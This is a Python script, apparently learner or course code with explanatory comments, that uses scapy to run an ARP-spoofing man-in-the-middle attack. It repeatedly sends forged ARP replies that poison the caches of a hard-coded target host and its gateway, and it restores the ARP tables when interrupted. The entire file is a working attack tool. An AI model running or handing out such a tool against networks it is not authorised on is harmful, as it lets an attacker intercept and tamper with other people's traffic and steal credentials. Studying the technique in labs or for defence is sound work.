#!/usr/bin/env python
#arp-spoofer
import scapy.all as scapy
import time
import sys

def get_mac(ip):                                                                    #give the ip end recieve the mac of it
    arp_request = scapy.ARP(pdst=ip)                                                #ARP Class, object pdst from scapy and variable ip
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                                #create an ethernet object from scapy using class Ether
    #or use  broadcast.dst = "ff:ff:ff:ff:ff:ff"
    arp_request_broadcast = broadcast/arp_request                                   #combine the two
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]   #Scapy function send and receive and 2 variables

    return(answered_list[0][1].hwsrc)                                               #return the mac address of the ip we gave


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 ARP Reuqestcap
    scapy.send(packet, verbose=False)                                         #do not print on screen

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac) #ARP response -is-at
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.178.173"
gateway_ip = "192.168.178.254"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:" + str(sent_packets_count)),                       #, -> do not print the output, \r overwrite the output
        sys.stdout.flush()                                                          #flush the standard output, do not wait until the programm stops. not storing in the buffer
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Restting ARP tables..... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)